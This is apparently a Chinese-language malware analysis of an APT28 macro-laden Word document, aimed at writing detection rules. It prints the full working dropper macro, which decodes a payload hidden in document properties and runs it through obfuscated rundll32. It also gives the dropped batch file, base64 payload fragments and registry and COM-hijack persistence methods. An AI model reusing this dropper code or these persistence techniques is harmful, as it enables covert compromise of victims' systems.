APT28-Cyber_Conflict

攻击手法 office 宏攻击

成功提取了样本，样本数量比预想的要多几个233 

针对样本进行分析  94b288154e3d0225f86bb3c012fa8d63  这个样本为一个doc文档

其宏存在加密 ，然后在网上找了一个破解的软件 ，提取了密码  ,进行了破解

![20180718160359.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180718160359.png?raw=true) 

成功跟进到宏代码如下



```vbscript
Sub AutoOpen()
    Execute  #在打开doc文件时自动执行宏代码 执行Execute函数
End Sub

Private Function DecodeBase64(base64) As Byte()  #解密函数
    Const decodeTable = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
          
    If 0 <> Len(base64) Mod 4 Then
        Exit Function
    End If
      
    outputLen = (Len(base64) / 4) * 3
    If "=" = Mid(base64, Len(base64), 1) Then
        outputLen = outputLen - 1
    End If
    If "=" = Mid(base64, Len(base64) - 1, 1) Then
        outputLen = outputLen - 1
    End If
      
    Dim decodedBytes() As Byte
    ReDim decodedBytes(outputLen - 1)
    outputIndex = 0
          
    For quartet = 1 To Len(base64) Step 4
        groupBase64Number = 0
        Const base = 64
        realBytesInThisGroup = 3
        For i = 0 To 3
           inputChar = Mid(base64, quartet + i, 1)
           indexInTable = 0
        
           If "=" = inputChar Then
                realBytesInThisGroup = realBytesInThisGroup - 1
           Else
                indexInTable = InStr(1, decodeTable, inputChar, vbBinaryCompare) - 1
           End If
                 
           If -1 = indexInTable Then
                Exit Function
           End If
             
           groupBase64Number = (groupBase64Number * base) + indexInTable
        Next
      
        groupBase64Number = Hex(groupBase64Number)
            
        'add leading zeroes, lengt of hex = 6:
         groupBase64Number = String(6 - Len(groupBase64Number), "0") & groupBase64Number
            
        'split hex number into 3 groups, 2 hex characters each:
        decodedBytes(outputIndex) = CByte("&H" & Mid(groupBase64Number, 1, 2))
        outputIndex = outputIndex + 1
        If realBytesInThisGroup > 1 Then
            decodedBytes(outputIndex) = CByte("&H" & Mid(groupBase64Number, 3, 2))
            outputIndex = outputIndex + 1
            If realBytesInThisGroup > 2 Then
                decodedBytes(outputIndex) = CByte("&H" & Mid(groupBase64Number, 5, 2))
                outputIndex = outputIndex + 1
            End If
        End If
    Next
      
    DecodeBase64 = decodedBytes
End Function
     
Private Sub Execute()  #执行函数
    Dim Path As String
    Dim FileNum As Long
    Dim bin() As Byte
    Dim cmdLine As String
    Const HIDDEN_WINDOW = 1
    strComputer = "."
    
    'extract and decode encoded file  进行提取与解码  分别提取了 文件 属性  详细信息里数据（均为base64段）为  主题  公司  
    Subject = ActiveDocument.BuiltInDocumentProperties.Item("Subject") #主题 数据
    Subject = Right(Subject, Len(Subject) - 50)
    
    Company = ActiveDocument.BuiltInDocumentProperties.Item("Company")  #公司 数据
    Company = Right(Company, Len(Company) - 50)
    
    Category = ActiveDocument.BuiltInDocumentProperties.Item("Category") #类别  数据
    Category = Right(Category, Len(Category) - 50)
    
    Hyperlink_base = ActiveDocument.BuiltInDocumentProperties.Item("Hyperlink base") # 翻译是超链接基础，实际看 文件 名称哪里 也有hash段  看了相关文章 有点不一样 需要去看下提取方法
    Hyperlink_base = Right(Hyperlink_base, Len(Hyperlink_base) - 50)
    
    Comments = ActiveDocument.BuiltInDocumentProperties.Item("Comments") #注释
    Comments = Right(Comments, Len(Comments) - 50)
    
    
    base64 = Subject + Company + Category + Hyperlink_base + Comments
    bin = DecodeBase64(base64) #进行 base64 解密

    'save decoded file
    Path = Environ("LOCALAPPDATA") + "\" + "netwf" + ".dat"  #生成文件名路径
    
    PathPld = Environ("LOCALAPPDATA") + "\" + "netwf" + ".dll" #生成文件名路径
    PathPldBt = Environ("LOCALAPPDATA") + "\" + "netwf" + ".bat" #生成文件名路径
    
    If Dir(PathPld, vbHidden) <> "" Then  #设置 隐藏属性
        Exit Sub
    End If
    
    FileNum = FreeFile  
    Open Path For Binary Access Write As #FileNum 生成文件
    Put #FileNum, 1, bin
    Close #FileNum
        #混淆 cmd 段
    cmdLine = "C:\" + "###" + "Win" + "###" + "dow" + "###" + "s\Sy" + "###" + "ste" + "###" + "m32\" + "run" + "###" + "dll" + "32" + "#" + ".exe " + """" + Path + """" + "###" + ",KlpSvc"
        WordBasic.[Shell] Replace(cmdLine, "#", "")  # 替换 执行字符串
    
        If Dir(PathPld) <> "" Then  #进行隐藏属性设置
       SetAttr PathPld, vbHidden
    End If
    
        If Dir(PathPldBt) <> "" Then  #进行隐藏属性设置
         SetAttr PathPldBt, vbHidden
    End If
    
        If Dir(Path) <> "" Then  #进行文件删除
         Kill Path
    End If

End Sub


```







在信息提取方面 发现VBA 有自己的调试器  好用 啊  可以 ADD watch 之后单步调试666

![QQ20180718161508.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/QQ20180718161508.png?raw=true) 





单步情况下

Subject="TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACseA3F6BljlugZY5boGWOWh2/IlsEZY5aHb/2W+BljlodvyZabGWOW4WHwluMZY5boGWKWjhljlodvzJ



Company="T2BkB1BYAOAusJZosAZokDg8MCK13wiV306ZL+////FRTQABBqBV47xnUX6Nrr///HAAkAAADo4uv//4kw6Wr+//+D+G0PhVr+//+DZewA6Vz+//8zwF9bXsnDahBokPYAEOh39P//i10Ig/v+dRvoqev//4MgAOiO6///xwAJAAAAg8j/6bYAAACF23gIOx0oOgEQchroguv//4MgAOhn6///xwAJAAAA6Bb0///r0ovDwfgFjTyFQDoB



Category="6FKF////tsgAAADoR4X///+2zAAAAOg8hf//g8RA/7bQAAAA6C6F////trgAAADoI4X///+22AAAAOgYhf///7bcAAAA6A2F////tuAAAADoAoX///+25AAAAOj3hP///7boAAAA6OyE////tuwAAADo4YT///+21AAAAOjWhP///7bwAAAA6MuE////tvQAAADowIT///+2+AAAAOi1hP///7b8AAAA6KqE////tgABAADon4T///+2BA



Hyperlink_base="T+AAAAAAAAAAAAAFYBAQAQ0AAA5P4AAAAAAAAAAAAAmAEBAADQAAAYAAEAAAAAAAAAAADSAQEANNEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhgEBAHYBAQBkAQEAAAAAAPAAAQAEAQEA6AABACQBAQA6AQEA0gABAMAAAQC0AAEAqAABAJwAAQCCAAEAdAABAGIAAQBUAAEARAABADgAAQAUAQEAJAABAL4FAQCuBQEAngUBAJAFAQDeAQEA



Comments="FUTBiHXYi/joBjehYkAcOf913OhKKoQBLGAD6B2AAYuKNYFeWeAe2Goroo4Y3OgFgQQgAtxqLAMgAuANaAAAgABWAcEO5P914Ff/FUJUAWXwVuiYYBP/MHXs6NMBX0EG7GqAAGoAVv8VUAAEIcAMTINl9KAd8GohwW/0x0XwInFoEygAACCABEzBcH30geE1xkX/NHQJgAESlGAYdQTAATJqAQiNRf9ACvjojf0LgkmJo1NBo8hQ6I4TQE



base64= "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACseA3F6BljlugZY5boGWOWh2/IlsEZY5aHb/2W+BljlodvyZabGWOW4WHwluMZY5boGWKWjhljlodvzJ ..... 没显示完



bin 字符串在我的解密下 会崩溃只能跳过 单步 直接 获取 结果



path根路径

C:\Users\cong\AppData\Local



cmdline "C:\###Win###dow###s\Sy###ste###m32\run###dll32#.exe "C:\Users\cong\AppData\Local\netwf.dat"###,KlpSvc"



cmdline  replace 后

C:\Windows\System32\rundll32.exe "C:\Users\cong\AppData\Local\netwf.dat",KlpSvc



KlpSvc为参数



netwf.dat 在执行后 生成



netwf.bat 与 netwf.dll 



通过 

提取了生成了的 netwfbat 样本

```
set path = "%localappdata%\netwf.dll"
if NOT exist %path % (exit)
start rundll32.exe %path %,#1
```

执行DLL

同时添加了服务自启动与镜像劫持



#### 加解密分析--（base64加密）---自己一直觉得不对是因为数据获取不全（内存显示问题）

------vb脚本

```
Private Function DecodeBase64(base64) As Byte()  #解密函数
    Const decodeTable = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
          
    If 0 <> Len(base64) Mod 4 Then  #<>不等    
        Exit Function
    End If
      
    outputLen = (Len(base64) / 4) * 3   
    If "=" = Mid(base64, Len(base64), 1) Then
        outputLen = outputLen - 1
    End If
    If "=" = Mid(base64, Len(base64) - 1, 1) Then
        outputLen = outputLen - 1
    End If
      
    Dim decodedBytes() As Byte  #声明变量
    ReDim decodedBytes(outputLen - 1)  # 按理说 -2
    outputIndex = 0
          
    For quartet = 1 To Len(base64) Step 4  #循环步进为4
        groupBase64Number = 0
        Const base = 64
        realBytesInThisGroup = 3
        For i = 0 To 3
           inputChar = Mid(base64, quartet + i, 1) # 提取第一个
           indexInTable = 0  
        
           If "=" = inputChar Then
                realBytesInThisGroup = realBytesInThisGroup - 1
           Else
                indexInTable = InStr(1, decodeTable, inputChar, vbBinaryCompare) - 1   #搜索到的位置-1
           End If
                 
           If -1 = indexInTable Then
                Exit Function
           End If
             
           groupBase64Number = (groupBase64Number * base) + indexInTable  #0 * 64 + 12
        Next
      
        groupBase64Number = Hex(groupBase64Number)  返回 16进制
            
        'add leading zeroes, lengt of hex = 6:
         groupBase64Number = String(6 - Len(groupBase64Number), "0") & groupBase64Number  # &  字符串连接
            
        'split hex number into 3 groups, 2 hex characters each:
        decodedBytes(outputIndex) = CByte("&H" & Mid(groupBase64Number, 1, 2))
        outputIndex = outputIndex + 1
        If realBytesInThisGroup > 1 Then
            decodedBytes(outputIndex) = CByte("&H" & Mid(groupBase64Number, 3, 2))
            outputIndex = outputIndex + 1
            If realBytesInThisGroup > 2 Then
                decodedBytes(outputIndex) = CByte("&H" & Mid(groupBase64Number, 5, 2))
                outputIndex = outputIndex + 1
            End If
        End If
    Next
      
    DecodeBase64 = decodedBytes
End Function
```



[VB脚本写文件document属性](https://wangye.org/blog/archives/91/)





#### DAT 文件执行

DAT 运行 其实 DAT 文件 本身后缀的意义是 数据扩展文件格式其实并不唯一，在本文中DAT文件格式其实是DLL形式的

所以 就将 DAT文件转化理解为

C:\Windows\System32\rundll32.exe（DLL运行程序）        "C:\Users\cong\AppData\Local\netwf.dat"  （DLL）        ,KlpSvc (DLL函数)







```
同时对DLL进行分析



命令执行问题  OK 大致清洗  手法分析

DLL执行分析问题 OK  DLL执行大致流程清洗

文件基本属性信息提取问题 

攻击方式重现问题

家族聚类问题、行为集合问题





屡屡思路

加解密方法 分析  加解密呗   BASE64 编码（因为你 获取的数据不全。。。）

dat 分析  ---    攻击  手法 复现  自己写？ demo?  

dll 样本分析  家族分类  依靠点？ 行为集合 代码 识别率？

文件基本属性提取？ 

更改？



攻击手法点  自己写一套没意思

关键是 如何提取文件信息----- vbs脚本

自己生成


```



明确分析目的：

- [ ] 免杀加解密方法&对抗手段
- [ ] dat bat  dll 都做了啥  分析及 挖掘 思路
- [ ] 此类文档宏方式的提取和处理 复现问题
- [ ] 产出：yara(挖掘利用) 、snort(仅检测定位)、 行为集合(APT扫描工具及模糊搜索)、攻击手段模拟（mattck&ck）、基于VT大数据源过滤（yara--函数匹配--动态监测）、探测类（hfs站点探测----发包探测---成活率低）









netwfbat 作用就是drop 

dropper安装2个文件：

- netwf.bat：执行netwf.dll
- netwf.dll：有效负载

dropper实现了2个持久性机制：

 

- HKCU \ Environment \ UserInitMprLogonScript执行netwf.bat文件
- COM对象劫持以下CLSID：{BCDE0395-E52F-467C-8E3D-C4579291692E}，类[MMDeviceEnumerator](https://msdn.microsoft.com/en-us/library/windows/desktop/dd371399(v=vs.85).aspx)的CLSID 



#### netwfbat 解密点

![20180725164240.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180725164240.png?raw=true) 



![20180725164158.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180725164158.png?raw=true) 



解密了 4个值

以一个值为说明

通过内存传参数值分别为

​				esi地址起

​						解密key地址  10012bd8

​						解密key长度  00 00 00 22

​						解密数据地址  10012ccc

​						解密数据长度   00 00 00 0B



![20180725165416.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180725165416.png?raw=true) 

![20180725165404.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180725165404.png?raw=true) 

![20180725165453.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180725165453.png?raw=true) 

![20180725165648.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180725165648.png?raw=true) 



![20180725165718.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180725165718.png?raw=true) 



![20180725170634.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180725170634.png?raw=true) 

![20180725165746.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180725165746.png?raw=true) 

![20180725170522.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180725170522.png?raw=true) 



![20180725170707.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180725170707.png?raw=true) 



其他解密同理





**最后持续控制的马**

- 截图捕获（使用GDI API）;
- 数据/配置渗透;
- 执行代码;
- 文件下载;

#### netwfdll 分析

dll的调用  OD调试 方法，学到

[动态 dll 调试方法](https://www.cnblogs.com/feiyucq/archive/2010/06/07/1753465.html)

[OD调试多线程](https://blog.csdn.net/youngs0xff/article/details/71171862)

windows消息泵

![QQæªå¾20180726120504.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/QQ%E6%88%AA%E5%9B%BE20180726120504.png?raw=true) 

![20180726120650.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180726120650.png?raw=true) 



第一个函数 mutexname



![20180726120822.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180726120822.png?raw=true) 





解密函数

![20180726120725.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180726120725.png?raw=true) 





后面对于这个 10003147 解密函数调用全配置解密



解密出来的命令执行能力

![20180726121104.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180726121104.png?raw=true) 





该函数为 请求包

![20180726144456.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180726144456.png?raw=true) 





解密http请求 UA 头

![20180726153503.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180726153503.png?raw=true) 



标志戳解密

![20180726153608.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180726153608.png?raw=true) 



增加 服务 rundll 自启动

![20180726154040.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180726154040.png?raw=true) 



设置键名

![20180726154211.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180726154211.png?raw=true) 



连通性域名解密

![20180726154407.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180726154407.png?raw=true) 



C&C域名解密

![20180726154450.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180726154450.png?raw=true) 



循环机密 发送数据



![20180726154458.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180726154458.png?raw=true) 



payload数据

00EBFF0C   00167010  ASCII "TW96aWxsYS80LjAgKGNvbXBhdGlibGU7IE1TSUUgNy4wOyBXaW5kb3dzIE5UIDUu\r\nMTsgVHJpZGVudC80LjAp\r\n"



![20180726154830.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180726154830.png?raw=true) 



其实 一开始不是知道 解密了一堆 干啥玩意的



![20180726155439.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180726155439.png?raw=true) 

![20180726155559.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180726155559.png?raw=true) 



![20180726155738.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180726155738.png?raw=true) 



![20180726155831.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180726155831.png?raw=true) 

从这看出有 磁力链的 能力 基本格式 参考 迅雷

迅雷磁力链

thunder://QUFtYWduZXQ6P3h0PXVybjpidGloOmIyNTlkZTAzMjU0NTNkNDVjNTJiMzkwMTc1YzQ0M2FkMzBhODdjMDJaWg==



基本可以认定为通过磁力链下发配置

![20180726155927.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180726155927.png?raw=true) 



这之中一直比较在乎的字符串

![20180726160030.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180726160030.png?raw=true) 





![20180726160053.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180726160053.png?raw=true) 



基本可以确定请求为 通过post  c2c地址数据获取http回显内容



![20180726160154.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180726160154.png?raw=true) 



后面进行其他post 请求

![20180726160405.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180726160405.png?raw=true) 



![20180726160519.png](https://github.com/zhongshendoushuizhao/project/blob/master/APT&malwarle_learn/picture/20180726160519.png?raw=true) 







宏模拟方法 和 





- [x] 免杀加解密方法&对抗手段----------------特征识别--加密key -------进行代码段 yara监测 来 监控数据源-----然后函数对比 
- [x] dat bat  dll 都做了啥  分析及 挖掘 思路--------------------同上  多数据源  针对不同阶段的攻击手法、样本等 进行 yara模糊规则 精准规则  diff 函数表   snort 规则  行为集合来进行 源数据口样本监控和挖掘     
- [x] 此类文档宏方式的提取和处理 复现问题 ------------------------------VBA脚本批量生产此类文档 [使用BuiltInDocumentProperties设置或查询Word内置属性](https://wangye.org/blog/archives/91/)
- [x] 产出：yara(挖掘利用) 、snort(仅检测定位)、 行为集合(APT扫描工具及模糊搜索)、攻击手段模拟（mattck&ck）、基于VT大数据源过滤（yara--函数匹配--动态监测）、探测类（hfs站点探测----发包探测---成活率低）



| Initial   Access 初始访问 | Execution执行 | Persistence   驻留系统           | Privilege   Escalation提权 | Defense   Rvasion逃避防御检测 | Credential   Access 凭证访问 | Discovery 发现 | Lateral Movement   传播 | Collection 收集 | Exfiltration 泄露 | Command and   Control命令控制 |
| ------------------------- | ------------- | -------------------------------- | -------------------------- | ----------------------------- | ---------------------------- | -------------- | ----------------------- | --------------- | ----------------- | ----------------------------- |
| Spearphishing Attachment  | 脚本          | Registry Run Keys / Start Folder |                            | 混淆解码                      |                              |                |                         |                 |                   | 自定义命令和控制协议          |
|                           |               |                                  |                            |                               |                              |                |                         |                 |                   |                               |
|                           |               |                                  |                            |                               |                              |                |                         |                 |                   |                               |
|                           |               |                                  |                            |                               |                              |                |                         |                 |                   |                               |

